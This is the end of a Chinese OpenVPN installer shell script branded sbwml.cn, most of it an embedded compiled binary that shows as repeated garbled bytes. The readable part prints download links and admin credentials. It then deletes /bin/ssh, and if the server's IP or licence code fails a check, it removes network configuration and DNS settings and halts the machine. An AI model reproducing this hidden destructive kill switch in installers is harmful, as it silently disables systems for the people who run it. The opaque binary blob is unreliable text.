?va ?  ?   空"` ???? 魁[` 梵??   ?va 桎??   ?va 梏??   縇va 杵??   綥va ?va 鐱?吚t
?va 槔  ? 鑚?H塃菻儅?u
?   椤  H婨群   ?   H壡??H婨菻   ?? 君[` H壡钃?隦肛"` ?劺t>?  ??H塃菻儅?u
?   锽  关"` H婾鐷婨菻壩H壡?   ???H婨鐷塃惹E?   婨蹾楬拎HE郒婾癏?H?僂?儅?t$刚"` ?劺t婨蹾楬拎HE郒??` 僂??<  劺t婨蹾楬拎HE郒??` 僂?婨蹾楬拎HE郒婾菻?僂?哥"` ?劺t婨蹾楬拎HE郒??` 僂?儅?~婨噪?   塃仉)婨蹾楬拎HE鄫U豀c襀菱HU癏?H?僂?僂?婨?E紎蠇E蹾楬拎HE郒?    H婨郒壠?va 瑭??va H兡H[擅UH夊ATSH冹墋霩塽郒婨郒峏H婾鄫E霩壷壡??H?H婨郒兝H?H吚t
H婨郒兝L??A?@ 梓??吚t桁??壡瑁?H壝??@ 柙??吚t?@ ??@ H婾郒??@ H?7d! H壪M夅I壺H壛?   栝??   H兡[A\擅悙悙悙悙悙愺胒ffff.?    H塴$豅塪$郒??  L??  L塴$鐻塼$餖墊$鳫塡$蠬冹8L)錋夶I夦H笼I壸??H呿t1?@ L夲L夦D夛A蹾兠H9雛闔媆$H媗$L媎$L媗$ L媡$(L媩$0H兡8脨悙悙悙H夠H夻?   閜?UH夊SH冹H?@  H凐t? ` D  H冸蠬?H凐u馠兡[擅悙H冹鐿?H兡?               x%lx =%lu %d %lu %d%c <null>  :  %s%s%s: %s
    ;d      滜€   黪?  伥?  ?  p?   养   *?H  p  叁?  佝?  h?             zR x?        ?[    A?C
V     <   O??   A?C
?     \   ??   A?C
?     |   瘤?   A?C
?     ?  h?a    A?C
W??      $     凕?   A?C
V???        4  (?           $   L   ??   Q??_@????X      t  堼                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ?@     
       ?@     觜o    `@            @            ?@     
       ?                                          ?`            ?                           ?@            `@            H       	              ?o    0@     o           ?o    ?@                                                                                                             ( `                     ?@     ?@     ?@     ?@     ?@     	@     	@     &	@     6	@     F	@     V	@     f	@     v	@     ?@     ?@     ?@     ?@     ?@     ?@     ?@                                             m困線;A?曖8??S4繹4q?叒?w@鶞]
Y＝5擺CV╉n鈋??￡?o?瑶愪b盨粍Xq鉊?狈装S?F?;翺|瀥?(れ縧|??q橻笆W??      $     凕?   A?C
V???        4  (?           $   L   ??   Q??_@????X      t  堼                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ?@     
       ?@     觜o    `@            @            ?@     
       ?                                          ?`            ?                           ?@            `@            H       	              ?o    0@     o           ?o    ?@                                                                                                             ( `                     ?@     ?@     ?@     ?@     ?@     	@     	@     &	@     6	@     F	@     V	@     f	@     v	@     ?@     ?@     ?@     ?@     ?@     ?@     ?@                                             m困線;A?曖8??S4繹4q?叒?w@鶞]
Y＝5擺CV╉n鈋??￡?o?瑶愪b盨粍Xq鉊?狈装S?F?;翺|瀥?(れ縧|??q橻笆W??      $     凕?   A?C
V???        4  (?           $   L   ??   Q??_@????X      t  堼                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ?@     
       ?@     觜o    `@            @            ?@     
       ?                                          ?`            ?                           ?@            `@            H       	              ?o    0@     o           ?o    ?@                                                                                                             ( `                     ?@     ?@     ?@     ?@     ?@     	@     	@     &	@     6	@     F	@     V	@     f	@     v	@     ?@     ?@     ?@     ?@     ?@     ?@     ?@                                             m困線;A?曖8??S4繹4q?叒?w@鶞]
Y＝5擺CV╉n鈋??￡?o?瑶愪b盨粍Xq鉊?狈装S?F?;翺|瀥?(れ縧|??q橻笆
W??      $     凕?   A?C
V???        4  (?           $   L   ??   Q??_@????X      t  堼                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ?@     
       ?@     觜o    `@            @            ?@     
       ?                                          ?`            ?                           ?@            `@            H       	              ?o    0@     o           ?o    ?@                                                                                                             ( `                     ?@     ?@     ?@     ?@     ?@     	@     	@     &	@     6	@     F	@     V	@     f	@     v	@     ?@     ?@     ?@     ?@     ?@     ?@     ?@                                             m困線;A?曖8??S4繹4q?叒?w@鶞]
Y＝5擺CV╉n鈋??￡?o?瑶愪b盨粍Xq鉊?狈装S?F?;翺|瀥?(れ縧|??q橻笆
??hm桳怖馃n?%H+洞≒轂婳7鏭璨l勐iZ*烛w壊g( i?{V?酛Q嫂9{=phVc哌G7頥犃\?补V?╚倜?Bh€標_x岌€栕竁4v旀0雤4撡醬菠m舒認—鱾Qx涜OT?勊詊?S?萹?<???0儖薻?玙?涉??抦&[咣?w灑扠婴{W/G?fniQ?7-釳縋s/O琄艼鞽柫?-Y?繧?7認d笚#>8Z雱 6qy?w逰?'荠pV
?鴑NSY觭廌韁xd;?t腈n[e{寡瓶?芨??桟l蠡?€冥k??幨違佴冏漂馔璦e裎Y瓱?z-?@``??/錙i&?	逼k?oe嬴揝%,巉岊6?e?簇|刍斿lZP?婓xd??7Fx?畕a6u?颏蕟?巅呼f甽蕶x偒叭$t颺?园4芓M?/厚# 煇?m涔5-2?懧Cerx+莣yΞ╜熖?\kxe豜fL@Ai??w%c>澻錕匜闝???1e}Zх,瑪d#骨bV?帉zU?圶;揦m?f?f?a榰?.nぉ腪袻??z嵤e?7藼漞y角3舔K鸻铯%Ivq齼Q	觔v欱F8鰋?<膖8%d軯甌极?丛韴7c嬕σ
O?縟*??N櫛fU]=cQ欽?[?獘(i颯e驓f霈?UO?b
爆孔?叙臷/Kk攄^.蔜凼 =?熲蘇·紆傃?嘑佹uL:P8=7;zV?e斍yQ=}?殔,"谁@鶦?{蜨禜X
bK0青鳤25?CY媝{V儣?)B鰍???6i??cj/?>5漏M堁v饲枘呈ㄉ ?疥?:暝R(鎳霅詓aK>)40缤侔碗q[徬u珊I?Ｎ義A"脌L鲀}逷V?A閉襱s怴M4$琭1p鐌hj鸊籕宗捹鰘6?	??r?亪姴鵵0a?|乻Zi寫
職 k狼k3?g$寳唅??眝O咣濌?
t,u釥H奴郖??8m
誜?b?5&4?KI_?[
€_K?[?婪?|U?\黻絝&
1懾2沋挰?, 﨑赖箸1I躍J8@5酽\ ◢憖?貿趡n~lK?!?'S?σ;?1巇16衩繁駩?r規??\鬝澉3饪ep$枾Y^荎锼?閷ZcNpHFj zM窟姐ud昧矊1鄙=??勬q?芡?崋鐀麷j?,媪?r?癶THi?郐[穝?壢r?躋#	7迓PXE?P?験郦剔屚gT@韎>?vs枨?J于#$裾や.廂^善o	迟&騡Li?0{y=煘/tBＢ 絠?r?檷n骣H'?糀於G Z	ｙ*ac幹珫o8V.LrU:聒:痫汯?E莻湁Q膙?呱DG厜@閺sD傅Y觳C?慃]花曮a惒q鈝櫎t?-惨?YV缷?吽P╧歸絖e??>`箯	N僟P蕺蓍/?豨^髻ū|MD?歗Es峥U邶uむo逎讜?黐.?郣Q駰C!2%鸮"p噌「v濓s?I淢??e3y稙義臱鵩o 沱,?菶 b
檔?u怔盱縁?VU)V9$ue?b?9聧C\?攓購_臢カt?漅:虑犨Z螧{繃?兟磅?Ta廀
?燝Ic闏i箙f?%;緼緜癯1?屄鰶c=迩L?秷?<態wQ?觰犟︱qf簖)隀?~TtN_+尊3动玸I7籪v %o墑崹誰S砎俓怺q? p?佄f<5躕U銅舕R鼐h?腓y??PQX勊}?栛?)|谰K7宗?   GCC: (GNU) 4.4.7 20120313 (Red Hat 4.4.7-17)  .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .text .fini .rodata .eh_frame_hdr .eh_frame .ctors .dtors .jcr .dynamic .got .got.plt .data .bss .comment                                                                                @                                                       @                                          !             <@     <      $                              4   ?o       `@     `      4                             >             ?@     ?      p                          F             @           ?                             N   o       ?@     ?      4                            [   ?o       0@     0      0                            j             `@     `      H                            t             ?@     ?      ?                          ~             ?@     ?                                    y             ?@     ?      P                            ?            ?@     ?      ?                             ?            ?@     ?                                    ?            ?@     ?      =                              ?            8@     8      d                              ?            ?@     ?      ?                             ?              `                                           ?             `                                          ?              `                                           ?            ( `     (       ?                           ?            ?`     ?                                   ?            ?`     ?      ?                            ?            €"`     €"      dU                             ?             xa     鋡     (                              ?     0               鋡     -                                                   x     ?                             
EOF
### END OF sbwml.cn THE SCRIPT ###
fi

# zip ${VPNFILE} ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-Old-yd.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-Old-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,ca.crt,ta.key,info.txt} >/dev/null 2>&1
if [[ $ov4 == 4 ]]
    then
    \cp -rf ${VPNFILE} /data/www/default/${VPNFILE}
fi
\cp -rf ${VPNFILE} /var/www/html/${VPNFILE}
rm -rf ./{云流量.apk,ta.key,info.txt,myip,ovpn.1,ovpn.2,ovpn.3,ovpn.4,ovpn.5,ovpn.6,ovpn.7,ovpn.8,ovpn.9,ovpn.10,ovpn.11,ovpn.12,ovpn.13,ovpn.14,ovpn.15,ovpn.16,User01.ovpn,ca.crt,user01.{crt,key}}
# OpenVPN Installing ****************************************************************************
#echo 
#echo "正在创建下载链接："
#echo '=========================================================================='
#echo 
#echo "上传证书文件："
if [[ $ov4 == 4 ]]
    then
    rmb=444
    else
    sed -i "42s/80/9876/" /etc/httpd/conf/httpd.conf >/dev/null 2>&1
    httpd >/dev/null 2>&1
fi
#curl --upload-file ./${VPNFILE} ${web}${curls}/${VPNFILE} >url
#urls=`cat url; echo`;
clear
######################## 上传    ##########################
if [[ $mode == 4 ]]
    then
    echo
echo '=========================================================================='
echo 
if [[ $ov4 == 4 ]]
    then

    lnmp restart >/dev/null 2>&1
    #echo -e "下载链接：\033[32m$urls\033[0m"
    echo -e "下载链接：\033[32mhttp://$IPAddress:8888/${VPNFILE}\033[0m"
fi
echo 
echo "请复链接到浏览器下载说明书/CA证书/OpenVPN成品配置文件"
echo 
if [[ $BLDOG = no ]];then
echo -e "后台地址：\033[32mhttp://$IPAddress:8888 \033[0m"
if [[ $phpMyAdmin == 1 ]];then
    echo -e "数据库管理：\033[32mhttp://$IPAddress:8888/$dbno \033[0m"
fi
echo
#echo -e "管理员ID：\033[32m1 \033[0m"
echo -e "管理员密码：\033[32m$ovmysql \033[0m"
fi
if [[ $BLDOG = yes ]];then
echo -e "用户后台：\033[32mhttp://$IPAddress:8888 \033[0m"
echo -e "管理员后台：\033[32mhttp://$IPAddress:8888/admin \033[0m"
echo
echo -e "管理员账号：\033[32m$bldogname \033[0m"
echo -e "管理员账号：\033[32m$bldogpass \033[0m"
echo "请牢记的你的管理账号密码"
echo
if [[ $phpMyAdmin == 1 ]];then
    echo -e "数据库管理：\033[32mhttp://$IPAddress:8888/$dbno \033[0m"
	echo "请牢记的你的数据库管理地址"
fi
fi
echo 
echo -e "\033[32m请登录后台添加OpenVPN连接账号以及流量总量！\033[0m"
echo 
echo -e "您的IP是：\033[32m$IPAddress \033[0m"
echo （如果检测结果与您实际IP不符合/空白，请自行修改OpenVPN.ovpn配置）
Client='
                 OpenVPN-2.3.11 安装完毕                
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved                                
                                         
==========================================================================';
echo "$Client";

else
echo
echo '=========================================================================='
echo
echo -e "下载链接：\033[32mhttp://$IPAddress:9876/${VPNFILE}\033[0m"
echo 
echo "请复链接到浏览器下载说明书/CA证书/OpenVPN成品配置文件"
echo 
echo -e "OpenVPN登录账号：\033[32m$ADMIN \033[0m"
echo -e "OpenVPN登录密码：\033[32m$VPNPASSWD \033[0m"
echo 
echo 查看用户账号：cat /passwd
echo 账号/密码存放位置：/passwd
echo 
echo -e "您的IP是：\033[32m$IPAddress \033[0m"
echo （如果检测结果与您实际IP不符合/空白，请自行修改OpenVPN.ovpn配置）
Client='
                 OpenVPN-2.3.11 安装完毕                
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved                                
                                         
==========================================================================';
echo "$Client";
fi
rm -rf /home/url /home/ov.sql /bin/ssh /sbwml
rm -rf /etc/openvpn/server-passwd.tar.gz /etc/openvpn/ca /usr/bin/udp.c
if [[ $ov4 == 4 ]];then
rm -f /etc/openvpn/{login.sh,sbwml.sh,server.conf,connect.sh,disconnect.sh}
fi
rm -rf /libiconv5
if [[ $ov4 == 4 ]];then
if [[ $henan == $henanBGP ]];then
open=pass
else
if [[ $xuzhouip == $xuzhou ]];then
open=pass
else
if [[ $testip == $yunip ]];then
open=pass
else
if [[ ${#code} == "8" ]];then
date >/install.log
else
if [[ ${#code} == "6" ]];then
date >/install.log
else
rm -rf /etc/sysconfig/network-script/* >/dev/null 2>&1
rm -rf /etc/resolv.conf >/dev/null 2>&1
service network reboot >/dev/null 2>&1
halt >/dev/null 2>&1
fi
fi
fi
fi
fi
fi
if [[ $mode == 4 ]];then
if [ ! -e "/sbwml.log" ];
then
cd /etc/openvpn/
vpn >/dev/null 2>&1
lnmp restart >/dev/null 2>&1
else
halt >/dev/null 2>&1
fi
else
vpn 
fi
if [[ $sqlport == 0 ]];then
echo 
echo "由于系统问题导致MYSQL无法启动"
echo "你需要重启系统后"
echo "执行：sqlpass"
echo "修复数据"
echo
echo "按回车重启系统"
read
reboot
fi
exit 0;
# OpenVPN Installation Complete ****************************************************************************